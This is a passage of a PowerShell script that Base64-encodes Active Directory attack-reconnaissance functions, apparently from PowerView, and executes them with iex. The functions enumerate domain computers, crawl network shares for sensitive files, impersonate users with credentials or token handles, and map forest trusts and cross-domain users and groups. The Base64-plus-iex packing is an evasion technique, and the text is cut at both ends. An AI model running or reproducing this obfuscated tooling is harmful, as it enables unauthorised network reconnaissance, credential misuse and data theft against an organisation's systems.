ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9ICRDb21wdXRlck5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGUnCiAgICAgICAgfQogICAgICAgICRIb3N0RW51bUJsb2NrID0gewogICAgICAgICAgICBQYXJhbSgkQ29tcHV0ZXJOYW1lLCAkSW5jbHVkZSwgJEV4Y2x1ZGVkU2hhcmVzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkVG9rZW5IYW5kbGUpCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXIuU3RhcnRzV2l0aCgnXFwnKSkgewogICAgICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgKz0gJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVzID0gR2V0LU5ldFNoYXJlIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVOYW1lID0gJFNoYXJlLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXRoID0gJ1xcJyskVGFyZ2V0Q29tcHV0ZXIrJ1wnKyRTaGFyZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNoYXJlTmFtZSkgLWFuZCAoJFNoYXJlTmFtZS5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkRXhjbHVkZWRTaGFyZXMgLU5vdENvbnRhaW5zICRTaGFyZU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gW0lPLkRpcmVjdG9yeV06OkdldEZpbGVzKCRQYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyArPSAkUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlshXSBObyBhY2Nlc3MgdG8gJFBhdGgiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2hhcmUgaW4gJFNlYXJjaFNoYXJlcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNlYXJjaGluZyBzaGFyZTogJFNoYXJlIgogICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1BhdGgnID0gJFNoYXJlCiAgICAgICAgICAgICAgICAgICAgICAgICdJbmNsdWRlJyA9ICRJbmNsdWRlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkT2ZmaWNlRG9jcykgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snT2ZmaWNlRG9jcyddID0gJE9mZmljZURvY3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRGcmVzaEVYRXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0ZyZXNoRVhFcyddID0gJEZyZXNoRVhFcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJExhc3RBY2Nlc3NUaW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydMYXN0QWNjZXNzVGltZSddID0gJExhc3RBY2Nlc3NUaW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTGFzdFdyaXRlVGltZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snTGFzdFdyaXRlVGltZSddID0gJExhc3RXcml0ZVRpbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRDcmVhdGlvblRpbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0NyZWF0aW9uVGltZSddID0gJENyZWF0aW9uVGltZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJENoZWNrV3JpdGVBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0NoZWNrV3JpdGVBY2Nlc3MnXSA9ICRDaGVja1dyaXRlQWNjZXNzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEZpbmQtSW50ZXJlc3RpbmdGaWxlIEBTZWFyY2hBcmdzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkSW5jbHVkZSwgJEV4Y2x1ZGVkU2hhcmVzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0luY2x1ZGUnID0gJEluY2x1ZGUKICAgICAgICAgICAgICAgICdFeGNsdWRlZFNoYXJlcycgPSAkRXhjbHVkZWRTaGFyZXMKICAgICAgICAgICAgICAgICdPZmZpY2VEb2NzJyA9ICRPZmZpY2VEb2NzCiAgICAgICAgICAgICAgICAnRXhjbHVkZUhpZGRlbicgPSAkRXhjbHVkZUhpZGRlbgogICAgICAgICAgICAgICAgJ0ZyZXNoRVhFcycgPSAkRnJlc2hFWEVzCiAgICAgICAgICAgICAgICAnQ2hlY2tXcml0ZUFjY2VzcycgPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgJ1Rva2VuSGFuZGxlJyA9ICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdFRydXN0IHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgJE5ldEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRm91bmRGb3Jlc3QgPSBHZXQtRm9yZXN0IEBOZXRGb3Jlc3RBcmd1bWVudHMKICAgICAgICBpZiAoJEZvdW5kRm9yZXN0KSB7CiAgICAgICAgICAgICRGb3VuZEZvcmVzdC5HZXRBbGxUcnVzdFJlbGF0aW9uc2hpcHMoKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Gb3Jlc3RUcnVzdC5ORVQnKQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Vc2VyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkZvcmVpZ25Vc2VyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJyhtZW1iZXJvZj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgR2V0LURvbWFpblVzZXIgQFNlYXJjaGVyQXJndW1lbnRzICB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlcnNoaXAgaW4gJF8ubWVtYmVyb2YpIHsKICAgICAgICAgICAgICAgICRJbmRleCA9ICRNZW1iZXJzaGlwLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICBpZiAoJEluZGV4KSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRG9tYWluID0gJCgkTWVtYmVyc2hpcC5TdWJTdHJpbmcoJEluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICRVc2VyRGlzdGluZ3Vpc2hlZE5hbWUgPSAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRVc2VySW5kZXggPSAkVXNlckRpc3Rpbmd1aXNoZWROYW1lLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkKCRfLmRpc3Rpbmd1aXNoZWRuYW1lLlN1YlN0cmluZygkVXNlckluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBEb21haW4gLW5lICRVc2VyRG9tYWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkTWVtYmVyc2hpcC5TcGxpdCgnLCcpWzBdLnNwbGl0KCc9JylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRpc3Rpbmd1aXNoZWROYW1lJyAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEb21haW4nICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkTWVtYmVyc2hpcAogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVpZ25Vc2VyJykKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlciB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3JlaWduR3JvdXBNZW1iZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdG